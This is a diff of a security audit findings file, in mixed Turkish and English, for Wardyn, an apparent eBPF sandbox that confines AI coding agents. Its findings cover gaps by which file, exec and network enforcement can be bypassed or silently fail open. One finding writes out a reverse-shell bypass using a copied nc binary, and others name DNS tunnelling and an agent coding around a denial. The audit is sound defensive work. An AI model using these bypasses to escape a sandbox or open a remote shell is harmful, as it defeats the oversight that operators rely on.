 - **Konum:** `wardyn/src/policy.rs:320-325 (kern_execs), 422-428 (kernel_exec_denial); wardyn-ebpf/src/main.rs:415-433 (bprm_check)`
 - **Sorun:** `kern_execs` is built from `last_segment`, and `bprm_check` matches `linux_binprm->file`'s basename, so `/usr/bin/nc` and `./nc` are indistinguishable and `cp /usr/bin/nc /tmp/x && /tmp/x -e /bin/sh host 4444` bypasses the rule entirely. The reverse error also exists: a benign project file named `nc` cannot be executed. Nothing distinguishes an interpreter's payload either — `Event` carries no argv, so `exec /usr/bin/python3` from a reverse-shell one-liner is byte-identical in the feed to a normal build step. `busybox nc` is likewise invisible. The exec axis therefore contributes ~no enforcement value; its real value is the signal in the feed, and even that is weakened without argv.
@@ -772,6 +946,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟡 ORTA — Observation is sys_enter-only, so `BLOCK` and receipts are claimed for opens that failed with ENOENT/EACCES
 *`correctness` · efor: M · id: `sys-enter-no-outcome`*
 
+> **Durum:** ✅ **Kapatıldı** — the deciding hook reports its own outcome.
+
 - **Konum:** `wardyn-ebpf/src/main.rs:139-190 (sys_enter tracepoints); wardyn/src/main.rs:738-767 (drain → audit + receipt)`
 - **Sorun:** Every observed event is an *attempt* captured at syscall entry; there is no sys_exit correlation and no return code. `reconcile` then asserts an outcome (`denied = true`) purely from the policy mirror. An open of a non-existent path whose basename is a block key never reaches `security_file_open` (the kernel returns ENOENT during path walk), yet it is rendered `BLOCK`, counted in `denied`, written to the audit log with `denied: true`, and receipted to the agent with "Do not retry or work around a denial". The repo's own demo hits this: `scripts/demo.sh` writes `$DEMO/.env` and `~/.ssh/id_ed25519` *under enforcement*, so those creates are themselves EPERM'd, the files never exist, and the subsequent `cat` produces a phantom `BLOCK` row.
 - **Etki:** The agent is told a policy denied an operation that actually failed for an unrelated reason, and is instructed not to retry — so it abandons work over a typo'd path. The operator's audit log over-counts denials. Both undermine the receipt's credibility, which is the whole point of the M5 feature.
@@ -779,6 +955,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟡 ORTA — No schema validation, no `version` check, no dry-run — a typo'd section silently disables the whole policy
 *`dx` · efor: M · id: `no-schema-validation-or-dry-run`*
+
+> **Durum:** ✅ **Kapatıldı** — `deny_unknown_fields` throughout, plus `--dry-run`.
 
 - **Konum:** `wardyn/src/policy.rs:130-141 (RawPolicy), 217-230 (load); wardyn/src/main.rs:191-270 (parse_args), 388-396`
 - **Sorun:** `RawPolicy` has no `#[serde(deny_unknown_fields)]` and every section is `#[serde(default)]`, so `file:` instead of `files:` or `net:` instead of `network:` parses cleanly into an empty list — a policy that enforces nothing, or (with the network section lost) allows all egress. The `version` field is explicitly ignored, so a future v2 policy loads as v1. `Policy::load` silently falls back from `--policy` → `./policy.yaml` → the *embedded* default, and never reports which source won, so running from a different cwd silently changes policy. The only signal is `info!("policy loaded: {}", policy.summary())`, which is unreachable in the default TUI path because env_logger is initialised only when `!use_tui`. There is no `wardyn check-policy` / `--dry-run` / "what would happen if the agent opened X" command; `parse_args` accepts only `run` and `--all`, so a policy can only be tested by becoming root and launching a real process. (`--dry-run` is on the M4 roadmap, so partially acknowledged.)
@@ -788,6 +966,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟡 ORTA — Network rules have no port or protocol dimension, and the presets blanket-allow the entire private LAN
 *`feature` · efor: L · id: `no-port-or-protocol-axis`*
 
+> **Durum:** ✅ **Kapatıldı** — `port:` and `proto:`, with four LPM tiers.
+
 - **Konum:** `wardyn/src/policy.rs:150-155 (NetRuleRaw), 88-89 (blast_radius); policy.yaml:25-28`
 - **Sorun:** `NetRuleRaw` carries only `cidr | domain` and an action. The cgroup hook has `user_port` and `protocol` available in `bpf_sock_addr` and uses neither, so allowing a destination allows every port and both protocols — `blast_radius` honestly says "ALL egress to {ip} (any port/protocol)". Combined with the presets' blanket `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` allows, an agent under the strict preset may open arbitrary connections to every host on the corporate LAN, and may tunnel data out through the LAN DNS resolver (UDP/53 is fully permitted, and DNS is the classic exfil channel). Conversely, the deny-all `0.0.0.0/0` rule blocks DNS to any public resolver, so on a host that does not use a loopback stub or a RFC1918 resolver the agent cannot resolve anything — a total, undocumented breakage of the domain-allow model, which itself depends on DNS working.
 - **Etki:** "Deny all egress except GitHub and Anthropic" is, in practice, "deny all egress except GitHub, Anthropic, and everything on your LAN, on any port" — which includes internal databases, metadata-ish services on RFC1918, and a DNS tunnel. Meanwhile the policy can break DNS outright on cloud hosts whose resolver is public.
@@ -795,6 +975,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟡 ORTA — No path-prefix rules, no allow-listing, no per-process scoping — the useful policies cannot be written
 *`positioning` · efor: XL · id: `no-prefix-or-per-process-rules`*
+
+> **Durum:** ⏸️ **Bilerek açık** — roadmap — the kernel matcher is name/identity/CIDR keyed by design.
 
 - **Konum:** `wardyn/src/policy.rs:200-212 (Policy struct: three global lists), 393-398 (file_enforcement); wardyn-ebpf/src/main.rs:47-57 (block-only maps)`
 - **Sorun:** The kernel side has only *deny* maps (BLOCK_NAMES/BLOCK_DIRS/BLOCK_EXEC) keyed by a single path component, and the policy has no notion of subject. Consequences: you cannot express "the agent may read anything under /workspace and nothing else" (the canonical sandbox policy, and what bubblewrap/Landlock/seatbelt users expect); you cannot say "only /usr/bin/git may read ~/.gitconfig"; you cannot scope a rule to a subtree (`/home/me/secrets/**` reduces to the *name* `secrets` or the dir key `secrets`, matching any such directory anywhere). Every rule is global to the watched tree and phrased in bare names.
@@ -804,6 +986,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### ⚪ DÜŞÜK — "First match wins" is documented in three places and is false for network (LPM) and for files/exec under enforcement
 *`dx` · efor: S · id: `docs-contradict-net-semantics`*
 
+> **Durum:** ✅ **Kapatıldı** — documented in README and `--dry-run` output.
+
 - **Konum:** `policy.yaml:2-3; README.md:99; ARCHITECTURE.md:83; wardyn/src/policy.rs:4-6 (module doc)`
 - **Sorun:** The header of policy.yaml, the README's Policy section, the ARCHITECTURE Policy-model section, and policy.rs's own module doc all state that each list is ordered and first-match wins. For `network` the engine is longest-prefix-match, so ordering is irrelevant except as a tie-break — writing `{0.0.0.0/0: allow}` first followed by `{10.0.0.0/8: block}` blocks the LAN, the opposite of the documented reading. For files/exec under `--enforce`, ordering is discarded in the kernel entirely (see `kernel-ignores-rule-order`). ARCHITECTURE does explain the LPM semantics 34 lines further down, which makes the contradiction internal to one file.
 - **Etki:** Operators reason about their policy with the wrong model. For network this mostly fails safe (the presets happen to work under LPM); for files/exec it produces policies that silently do something other than what they read as.
@@ -812,6 +996,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### ⚪ DÜŞÜK — The startup honesty warnings are printed straight into the screen the TUI is about to replace
 *`dx` · efor: S · id: `honesty-warnings-invisible`*
 
+> **Durum:** ✅ **Kapatıldı** — see `startup-warnings-invisible-under-tui`.
+
 - **Konum:** `wardyn/src/main.rs:397-416 (eprintln warnings), 388-393 (logger gating); wardyn/src/tui.rs:310-313 (EnterAlternateScreen)`
 - **Sorun:** `observe_only_blocks()` and `overbroad_block_keys()` — the two messages that tell an operator their policy does not mean what it says — are emitted with `eprintln!` immediately before `tui::run` calls `execute!(out, EnterAlternateScreen)`. In the default interactive mode they flash for a few milliseconds and are then hidden for the whole session (restored only after `LeaveAlternateScreen` at exit, buried above the final summary). The kernel-mismatch warning, the BPF-LSM-unavailable warning, the pid-ns warning, and the policy summary (`info!`, which is not even initialised under the TUI) are all in the same position.
 - **Etki:** Wardyn does the hard work of computing exactly where its policy over- and under-reaches, then throws the result away in the mode most users run. The `config`-blocks-git catastrophe in strict.yaml *is* warned about — and nobody will ever see it.
@@ -819,6 +1005,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### ⚪ DÜŞÜK — Fixed map capacities and the 40-byte key width fail hard or degrade quietly at policy scale
 *`robustness` · efor: S · id: `map-capacity-and-name-width`*
+
+> **Durum:** ✅ **Kapatıldı** — `namelen-truncation` ile birlikte; genişlik hâlâ 40 bayt ama sınır artık belirsizliği dışarıda bırakıyor.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:41-57 (map sizes); wardyn/src/policy.rs:580-591 (name_key); wardyn/src/main.rs:89-119 (population)`
 - **Sorun:** `NET_RULES`/`NET_RULES6` hold 1024 entries and the BLOCK_* maps 256; `KernelMaps::load` propagates an insert failure with `?`, so a policy importing a threat-intel CIDR list (or a domain that expands widely) aborts startup with `populating NET_RULES` and no hint about the limit. On the other side, `name_key` returns `None` for any segment of 40 bytes or more, silently downgrading such a rule to observe-only — this one is at least surfaced through `observe_only_blocks()`, but the reason ("name too long for the kernel key") is never stated. The eBPF `read_name` truncates at the same width with `let _ = ...` discarding the error.
@@ -850,6 +1038,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🔴 KRİTİK — Nothing ever loads the eBPF object — zero verifier coverage, zero enforcement coverage
 *`testing` · efor: M · id: `no-ebpf-load-in-ci`*
 
+> **Durum:** ✅ **Kapatıldı** — `verifier_smoke` loads all 21 programs on every PR.
+
 - **Konum:** `.github/workflows/ci.yml:44-50; absence of any tests/ directory`
 - **Sorun:** CI compiles the BPF object via `build.rs`/aya-build and then throws it away. The only steps are `cargo build` and `cargo test`, and the workflow states the intent explicitly:
 
@@ -874,6 +1064,8 @@ Why critical rather than merely bad: SECURITY.md documents that Wardyn is fail-o
 
 ### 🔴 KRİTİK — No VM/kernel test harness — no end-to-end assertion that anything is ever actually blocked
 *`testing` · efor: L · id: `no-vm-e2e-harness`*
+
+> **Durum:** ✅ **Kapatıldı** — `tests/e2e/run.sh` — 73 assertions against a real BPF-LSM kernel, run in CI.
 
 - **Konum:** `repo-wide: no tests/, no xtask, no workflow using qemu/vmtest/virtme-ng`
 - **Sorun:** Even with a Tier-1 verifier smoke test, the behaviours users pay for remain unproven: does opening `.env` inside the watched subtree actually return EPERM? Does a process outside the subtree still reach `1.1.1.1` (README:64-67 sells this as "Surgically scoped & safe")? Does fork adoption survive to depth 3? Does the pid-namespace handshake work inside `unshare --pid`? Every one is a runtime-only property and every one has zero coverage.
@@ -901,6 +1093,8 @@ Worse, each is also a shipped bug that was fixed by hand. CHANGELOG.md's Fixed s
 ### 🟠 YÜKSEK — `cargo publish` is broken three ways and nothing checks it; no release workflow, artifacts, SBOM, or signing exists
 *`release` · efor: M · id: `cargo-publish-broken`*
 
+> **Durum:** 🔓 **Açık** — not re-verified; `wardyn-ebpf` is correctly `publish = false`, but no release has been attempted through crates.io.
+
 - **Konum:** `wardyn/src/policy.rs:215; wardyn/build.rs:11; Cargo.toml:21; wardyn/Cargo.toml:9-11; .github/workflows/ (no release.yml)`
 - **Sorun:** `wardyn/Cargo.toml` carries full crates.io metadata — `description`, `keywords = ["ebpf", "security", "sandbox", "bpf", "agent"]`, `categories` — so publication is clearly intended. It cannot work:
 
@@ -917,6 +1111,8 @@ Separately there is **no release engineering at all**: only `ci.yml` and `audit.
 ### 🟠 YÜKSEK — Floating nightly + unpinned bpf-linker + no `--locked`: the emitted BPF bytecode is not reproducible
 *`build` · efor: S · id: `unpinned-toolchain-nonreproducible-bpf`*
 
+> **Durum:** ✅ **Kapatıldı** — `rust-toolchain.toml` pins the nightly and `BPF_LINKER_VERSION` pins the linker, installed `--locked`.
+
 - **Konum:** `rust-toolchain.toml:4; .github/workflows/ci.yml:28-36, 47-50`
 - **Sorun:** Three independent sources of drift feed directly into the artifact loaded into the kernel:
 
@@ -930,6 +1126,8 @@ And although `Cargo.lock` is committed (41 KB, 170 packages), **no CI step passe
 
 ### 🟠 YÜKSEK — Hardcoded kernel struct offsets are validated by nothing but a two-component string compare of `uname`
 *`correctness` · efor: M · id: `offsets-never-validated`*
+
+> **Durum:** ✅ **Kapatıldı** — resolved from BTF and cross-checked against the running kernel.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:82-90; wardyn/src/main.rs:301, 323-340`
 - **Sorun:** File and exec enforcement dereference kernel structs at compile-time constants derived from one kernel:
@@ -953,6 +1151,8 @@ The codebase already solved this correctly once, for the fork tracepoint — `tr
 ### 🟠 YÜKSEK — `parse_args` is structurally untestable and untested, despite two shipped arg-parsing bugs
 *`dx` · efor: S · id: `parse-args-untestable`*
 
+> **Durum:** ✅ **Kapatıldı** — `parse_from` takes an iterator and is covered by unit tests.
+
 - **Konum:** `wardyn/src/main.rs:191-270, 378-383`
 - **Sorun:** `fn parse_args() -> anyhow::Result<Opts>` reads global state directly (`std::env::args().skip(1)`) and calls `std::process::exit(0)` inline for `--help`/`--version` (main.rs:204, 208). Both make unit testing impossible: you cannot supply arguments, and two branches terminate the test process.
 
@@ -966,6 +1166,8 @@ Both are exactly what a five-line table test pins forever. Neither has one. Rela
 
 ### 🟡 ORTA — No differential/property test between the kernel matcher and its userspace mirror — and they already disagree on NAME_LEN truncation
 *`testing` · efor: M · id: `no-property-test-kernel-mirror-truncation-bug`*
+
+> **Durum:** 🔓 **Açık** — çekirdek eşleştiricisiyle aynası arasında property/differential test yok. (Kırpılma hatası, o testin yakalayacağı türdendi ve elle bulundu.)
 
 - **Konum:** `wardyn/src/policy.rs:408-419, 580-591; wardyn-ebpf/src/main.rs:374-378, 397-403`
 - **Sorun:** The project's central honesty claim is that userspace reproduces the kernel matcher exactly (`kernel_file_denial` is documented at policy.rs:401-407 as "the userspace mirror of the kernel's matcher"). That equivalence is checked by one hand-written test with five hardcoded paths (policy.rs:748). There is no property test and no differential fuzzing, so a divergence surfaces only when a user notices a wrong colour.
@@ -992,6 +1194,8 @@ So with a blocked rule whose basename is exactly 39 bytes, the kernel denies eve
 ### 🟡 ORTA — No fuzzing: `parse_event` performs an unaligned read of kernel-supplied bytes and is the only `unsafe` in userspace
 *`testing` · efor: M · id: `no-fuzzing`*
 
+> **Durum:** 🔓 **Açık** — no fuzz target in the tree.
+
 - **Konum:** `wardyn/src/main.rs:774-779, 781-856, 975-983; wardyn/src/policy.rs:232-336`
 - **Sorun:** There is no `fuzz/` directory and no fuzz target. The obvious candidate is the ring-buffer decoder:
 
@@ -1011,6 +1215,8 @@ Honest scoping: memory-safety risk is limited because the BPF ring buffer is the
 ### 🟡 ORTA — The three shipped policy files are never parsed by any test — a typo ships to every user
 *`testing` · efor: S · id: `shipped-policies-never-parsed`*
 
+> **Durum:** ✅ **Kapatıldı** — dört sevk edilen politikanın dördü de birim testlerinde `include_str!` ile parse ediliyor (`contained.yaml` bu turda eklendi — sevk ediliyordu ama hiç yüklenmemişti).
+
 - **Konum:** `policy.yaml; policies/strict.yaml; policies/permissive.yaml; wardyn/src/policy.rs:215, 605-625`
 - **Sorun:** `policy.rs:215` embeds the repo's `policy.yaml` as the fallback used whenever no policy file is found: `const DEFAULT_POLICY: &str = include_str!("../../policy.yaml");`. `include_str!` only checks the file exists — a YAML syntax error, an unknown `action:` value, or a bad glob compiles fine and fails at **runtime**, for every user without a `./policy.yaml` (`Policy::from_yaml_str(DEFAULT_POLICY).context("parsing embedded default policy")`, policy.rs:229).
 
@@ -1020,6 +1226,8 @@ The unit tests never touch it: all 14 policy tests use the inline `const P` fixt
 
 ### 🟡 ORTA — Clippy never lints the eBPF crate, contradicting CONTRIBUTING's "warning-free, including the eBPF crate"
 *`dx` · efor: S · id: `clippy-skips-ebpf-crate`*
+
+> **Durum:** ✅ **Kapatıldı** — clippy runs against `bpfel-unknown-none` too.
 
 - **Konum:** `.github/workflows/ci.yml:41-42; Cargo.toml:6; CONTRIBUTING.md:47`
 - **Sorun:** `ci.yml:42` runs `cargo clippy --all-targets -- -D warnings` with no `--workspace`/`-p`, so it operates on the workspace's **default members** only:
@@ -1037,6 +1245,8 @@ CONTRIBUTING.md:47 tells contributors "Keep the build **warning-free**, includin
 ### 🟡 ORTA — No coverage measurement; `audit.rs` (the security record) and `tui.rs` have zero tests while the analogous `receipt.rs` property is tested
 *`testing` · efor: S · id: `no-coverage-audit-untested`*
 
+> **Durum:** ✅ **Kapatıldı** — `audit.rs` carries 9 tests; no coverage tooling, which is a reporting gap rather than an untested module.
+
 - **Konum:** `wardyn/src/audit.rs (0 tests); wardyn/src/tui.rs (0 tests); .github/workflows/ci.yml (no coverage step)`
 - **Sorun:** There is no `cargo-llvm-cov`/`tarpaulin` step, no badge, no threshold — so the distribution of the 21 tests is invisible. It is lopsided in a telling way: `receipt.rs` (189 lines, agent-facing, advisory) has 3 tests including one pinning its truncate-on-create security property; `audit.rs` (87 lines, described in its own header as "a security record") has **zero**, even though it encodes the exact opposite and equally deliberate property:
 
@@ -1053,6 +1263,8 @@ That append-vs-truncate choice is a CHANGELOG-documented fix ("Audit log is open
 ### 🟡 ORTA — Four shell scripts, one of which edits GRUB as root, are neither linted nor executed anywhere in CI
 *`testing` · efor: S · id: `no-scripts-lint-or-test`*
 
+> **Durum:** ✅ **Kapatıldı** — `shellcheck` runs in CI.
+
 - **Konum:** `scripts/enable-bpf-lsm.sh, scripts/setup-vm.sh, scripts/kernel-offsets.sh, scripts/demo.sh; .github/workflows/ci.yml`
 - **Sorun:** The onboarding path is entirely shell (README:74-89 → `enable-bpf-lsm.sh`, `setup-vm.sh`), and one script writes a **bootloader configuration file as root** and runs `update-grub`. None are shellcheck'd or executed in CI. The author is clearly shellcheck-aware — `setup-vm.sh:16` carries an inline `# shellcheck disable=SC1091` — but nothing runs it.
 
@@ -1062,6 +1274,8 @@ Untested distro assumptions are baked in: `enable-bpf-lsm.sh:28` does `cat > /et
 
 ### 🟡 ORTA — `resolve_domain` does live DNS inside `Policy::from_yaml_str`, making the documented `domain:` rule form untestable and any policy-parse test network-dependent
 *`dx` · efor: S · id: `resolve-domain-untestable`*
+
+> **Durum:** ✅ **Kapatıldı** — the resolver is injected, so tests never touch DNS.
 
 - **Konum:** `wardyn/src/policy.rs:281-297, 593-599`
 - **Sorun:** Policy compilation performs network I/O directly:
@@ -1084,6 +1298,8 @@ fn resolve_domain(domain: &str) -> Vec<IpAddr> {
 ### 🟡 ORTA — Supply chain beyond cargo-deny: actions pinned to mutable tags, no Scorecard, no cargo-vet/auditable, and a deny.toml comment that misstates its own config
 *`supply-chain` · efor: S · id: `actions-unpinned-supply-chain`*
 
+> **Durum:** 🔓 **Açık** — 0 of 16 `uses:` lines are pinned to a commit SHA.
+
 - **Konum:** `.github/workflows/ci.yml:24-36; .github/workflows/audit.yml:28-32; deny.toml:14-20; Cargo.lock:1061-1062`
 - **Sorun:** `cargo-deny` is genuinely well set up, but it is the only supply-chain control, and the workflows that *produce* the artifact are less protected than the dependencies they audit:
 
@@ -1097,6 +1313,8 @@ fn resolve_domain(domain: &str) -> Vec<IpAddr> {
 ### ⚪ DÜŞÜK — README/justfile quickstart is never executed in CI, and the release profile — the one users build — is never built
 *`testing` · efor: S · id: `readme-and-release-profile-untested`*
 
+> **Durum:** 🔓 **Açık** — not re-verified.
+
 - **Konum:** `.github/workflows/ci.yml:46-50; README.md:74-89; justfile:8-22`
 - **Sorun:** CI runs `cargo build` (debug) and `cargo test`. The commands the documentation instructs users to run are never executed:
 
@@ -1108,6 +1326,8 @@ fn resolve_domain(domain: &str) -> Vec<IpAddr> {
 
 ### ⚪ DÜŞÜK — CI builds only x86_64 although deny.toml advertises aarch64, and the LPM key encoding is little-endian-specific with no test
 *`portability` · efor: S · id: `no-cross-target-le-assumption`*
+
+> **Durum:** ✅ **Kapatıldı** — `from_ne_bytes`, `OFFSETS_ARCH` gating, and aarch64 release builds.
 
 - **Konum:** `deny.toml:7-11; .github/workflows/ci.yml:22; wardyn/src/policy.rs:355-371; wardyn/src/main.rs:143-149`
 - **Sorun:** `deny.toml` declares three supported targets (`x86_64-unknown-linux-gnu`, `aarch64-unknown-linux-gnu`, `bpfel-unknown-none`), but CI has a single `runs-on: ubuntu-latest` job and never cross-compiles for aarch64 — so "supported" is unverified. And it is not only about compilation: the v4 LPM trie key is built by reinterpreting network-order octets as a little-endian integer, in two places that must agree with a third:
@@ -1127,6 +1347,8 @@ versus the kernel side using the raw `user_ip4` word (wardyn-ebpf/src/main.rs:27
 ### ⚪ DÜŞÜK — The pure-logic policy engine is trapped inside a Linux-only binary crate, so `cargo test` cannot run on macOS or Windows
 *`dx` · efor: M · id: `policy-engine-linux-only`*
 
+> **Durum:** ✅ **Kapatıldı** — `wardyn-policy` is its own crate, tested on Linux, macOS and Windows.
+
 - **Konum:** `Cargo.toml:3-6; wardyn/Cargo.toml:13-32; wardyn/src/policy.rs`
 - **Sorun:** `policy.rs` is 853 lines of platform-independent logic depending only on `globset`, `ipnet`, `serde`, `serde_yaml`, `anyhow`, and `wardyn-common` — all cross-platform. But it lives inside the `wardyn` binary crate, which depends on `aya`, `libc`, and a `build.rs` that shells out to compile a `bpfel` target. So running the 14 policy tests requires a Linux machine with nightly and `bpf-linker`, and CONTRIBUTING.md:18-19 correctly tells macOS/Windows contributors to spin up a VM before they can run `cargo test` at all.
 
@@ -1136,6 +1358,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 
 ### 🔵 BİLGİ — CI hygiene: no job timeouts, no doc-link check, no nextest, eBPF crate rebuilt three times per run
 *`dx` · efor: S · id: `ci-hygiene-gaps`*
+
+> **Durum:** ✅ **Kapatıldı** — least-privilege permissions, concurrency cancellation, `--locked`, Dependabot.
 
 - **Konum:** `.github/workflows/ci.yml:21-50`
 - **Sorun:** Minor items, batched: (a) neither job sets `timeout-minutes`, so a hung `cargo install bpf-linker` or a wedged test burns up to the 6-hour default; (b) no `cargo doc --no-deps` with `-D rustdoc::broken_intra_doc_links` despite very heavy rustdoc use with intra-doc links throughout (`[`Action`]`, `[`kind`]`, `[`Event`]`, `[`tracefs_field_offset`]`, `[`learn_init_ns_tgid`]`, `[`Desc::denied`]`) — these rot silently; (c) `cargo test` gives no per-test visibility, isolation, or retry, which will matter as soon as root-requiring integration tests exist that must be gated and serialised; (d) `cargo clippy --all-targets`, `cargo build`, and `cargo test` each re-trigger `build.rs`, so the eBPF crate compiles up to three times per run.
@@ -1165,6 +1389,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 ### 🔴 KRİTİK — The planned "migrate to CO-RE" portability fix does not exist in aya — no version unlocks it; do runtime BTF offset resolution instead
 *`portability` · efor: M · id: `core-relocations-unavailable-in-aya`*
 
+> **Durum:** ✅ **Kapatıldı** — runtime BTF offset resolution was built instead; the plan the finding says does not exist was abandoned.
+
 - **Konum:** `wardyn-ebpf/src/main.rs:82-90, wardyn/src/main.rs:300-340`
 - **Sorun:** The project's central fragility is six hardcoded kernel struct offsets, and both the docs and the implied roadmap point at CO-RE/BTF relocations as the fix. That path is closed: rustc/LLVM cannot emit CO-RE relocations for the BPF target because `core::intrinsics::{preserve_access_index, preserve_field_info, preserve_type_info, preserve_enum_value}` are not implemented for it. aya tracks this as issue #349, opened 2022-07-25, still open with no assignee. Upgrading to aya 0.14.0 / aya-ebpf 0.2.1 (the open Dependabot branches `origin/dependabot/cargo/aya-0.14.0` and `aya-ebpf-0.2.1`) does NOT change this — aya's userspace can *apply* CO-RE relocations found in an object, but nothing in the Rust toolchain emits them. Any roadmap item that says "CO-RE" will burn weeks and land nowhere. The correct answer is already in this repo: resolve offsets at runtime in userspace and pass them through the `CONFIG` array, exactly as `tracefs_field_offset()` does for the fork tracepoint.
 - **Etki:** On any kernel that is not 6.8, `read_ptr(file, 160)` reads a wrong field, `bpf_probe_read_kernel` fails or returns garbage, `try_file_open` hits `Err(_) => OK` and fails open. `struct file` and `struct dentry` have been repacked several times in the 6.9-6.14 era, so this affects Ubuntu 24.04 HWE kernels, Fedora, Arch, and current WSL2 — i.e. most of the intended audience. The user sees a startup warning and a green feed and believes they are protected. Meanwhile the roadmap points at a fix that cannot be built.
@@ -1172,6 +1398,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 
 ### 🟠 YÜKSEK — `bpf_d_path` and `bpf_loop` are already in the pinned aya-ebpf 0.1.1 — the docs' central technical excuse is factually wrong, and full-path matching needs no upgrade
 *`portability` · efor: M · id: `bpf-d-path-already-shipped-in-pinned-aya`*
+
+> **Durum:** ⏸️ **Bilerek açık** — still worth adopting; two-segment keys plus `(dev, ino)` identity closed the cases that motivated it.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:360-389, README.md:211-213, ARCHITECTURE.md:119-121`
 - **Sorun:** README.md and ARCHITECTURE.md both justify the basename-only matcher (and, transitively, the over-block/under-block reconciliation machinery and several bypasses) by asserting that the pinned aya-ebpf 0.1 does not ship `bpf_d_path` or `bpf_loop`. Both helpers are present in aya-ebpf 0.1.1's raw-bindings module `aya_ebpf::helpers::gen`, which is exactly the escape hatch aya documents for helpers without a safe wrapper ("we provide some higher-level wrappers ... but also expose bindings to the underlying helpers as a fall-back"). The signature in 0.1.1 is `pub unsafe fn bpf_d_path(path: *mut path, buf: *mut i8, sz: u32) -> i64`. The kernel side cooperates for the file hook: `security_file_open` is in `btf_allowlist_d_path` (alongside `security_file_permission`, `security_inode_getattr`, `vfs_truncate`, `vfs_fallocate`, `dentry_open`, `vfs_getattr`, `filp_close`), so `lsm/file_open` may call it. `security_bprm_check` is NOT on the merged allowlist, so `bprm_check_security` needs a different route.
@@ -1181,6 +1409,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 ### 🟠 YÜKSEK — Denials are invisible to the feed, audit log and agent receipt when the syscall used a relative path — the headline feature silently fails
 *`correctness` · efor: M · id: `relative-path-denials-invisible`*
 
+> **Durum:** ✅ **Kapatıldı** — see `relative-path-mirror-blind`.
+
 - **Konum:** `wardyn/src/policy.rs:408-419, wardyn-ebpf/src/main.rs:160-190`
 - **Sorun:** The kernel's LSM hook matches on the *dentry* (resolved basename + immediate parent dir name). Userspace reconstructs that verdict from the *user-supplied string* captured by the `sys_enter_openat` tracepoint via `bpf_probe_read_user_str_bytes`. These are different objects. `kernel_file_denial()` needs at least two path segments to test the parent-dir rule, so any relative open with a single segment can never produce a `FileDir` key, even though the kernel will deny it. Concretely: with the shipped `policy.yaml` rule `{ match: "**/.ssh/**", action: block }`, `cd ~/.ssh && cat id_ed25519` makes the tracepoint record `"id_ed25519"`; `kernel_file_denial("id_ed25519")` takes `segs.next()?` for the name, then `segs.next()?` for the dir returns `None` and the function returns `None`. `reconcile()` therefore demotes the verdict, `Desc::denied()` is false, and neither `Audit::record` nor `Receipt::record` fires — while the LSM hook returns `-EPERM` because the parent dentry is `.ssh`. Symlink and hardlink opens diverge the same way (tracepoint sees the link name, LSM sees the resolved dentry).
 - **Etki:** The agent gets a bare `EPERM`, reads `$WARDYN_DENIALS`, finds nothing matching, and does exactly what the receipt was built to prevent: retries, reaches for `sudo`, or codes around the block. The operator's TUI shows a grey `ok` row for an operation the kernel refused, and the audit log — the security record — has no entry. This is the most damaging bug for the product thesis, and it is triggered by the single most common shell idiom.
@@ -1188,6 +1418,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 
 ### 🟠 YÜKSEK — The kernel never reports what it denied — every "BLOCK"/`enforced: true` in the audit log and receipt is a userspace guess
 *`correctness` · efor: M · id: `no-kernel-denial-ground-truth`*
+
+> **Durum:** ✅ **Kapatıldı** — `DENY_*` events plus per-axis kernel counters, cross-checked in e2e.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:174, 240, 376-386, 425-431; wardyn-common/src/lib.rs:44-45`
 - **Sorun:** `Event.action` is documented as "the verdict applied" but is hardcoded to `ALLOW` at every emission site; the enforcement programs (`try_connect4`, `try_connect6`, `try_file_open`, `try_bprm_check`) return `DENY`/`EPERM` and emit nothing. Userspace therefore reconstructs the denial set by re-implementing the kernel matcher (`Policy::kernel_file_denial`, `kernel_exec_denial`, `net_verdict`) and reconciling. That mirror is correct only as long as three things stay in sync: the observe tracepoint fired at all, the string it captured matches the dentry, and the userspace matcher matches the kernel matcher byte-for-byte. All three break in practice — the code itself documents two of the breaks (`load_tracepoint_optional` warns that a syscall variant may be untraceable; ARCHITECTURE.md:154 admits sendmsg denials cannot be receipted).
@@ -1197,6 +1429,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 ### 🟠 YÜKSEK — Nothing verifies that enforcement actually works; a wrong offset produces a silent green feed and a kernel-version string compare is the only guard
 *`robustness` · efor: S · id: `no-enforcement-selftest-silent-fail-open`*
 
+> **Durum:** ✅ **Kapatıldı** — verifier smoke plus the e2e suite.
+
 - **Konum:** `wardyn/src/main.rs:322-340, wardyn-ebpf/src/main.rs:352-358`
 - **Sorun:** Every kernel-side read failure path returns allow (`Err(_) => OK` in `file_open`, `Err(_) => ALLOW` in `connect4/6`). That is a defensible design choice, and SECURITY.md documents it as intentional. What is not defensible is that there is no positive confirmation anywhere that the deny path is live. The only guard is `warn_if_untested_kernel()`, which string-compares `major.minor` against `"6.8"` — it cannot detect a distro that backported a struct-layout change inside 6.8, it fires a scary warning on every modern kernel where the offsets might well be fine, and it is silent about the actual failure. The result is a tool that, on the majority of kernels, prints one warning at startup and then displays a fully-green feed indistinguishable from "the agent behaved perfectly".
 - **Etki:** Warning fatigue converts a security control into decoration. A user on kernel 6.11 sees the same yellow line they saw on 6.9 where everything worked, ignores it, and ships an agent believing `.ssh` is protected when it is not. For a tool whose entire value proposition is "it denies the syscall", "we cannot tell you whether we are denying anything" is the credibility-defining gap.
@@ -1204,6 +1438,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 
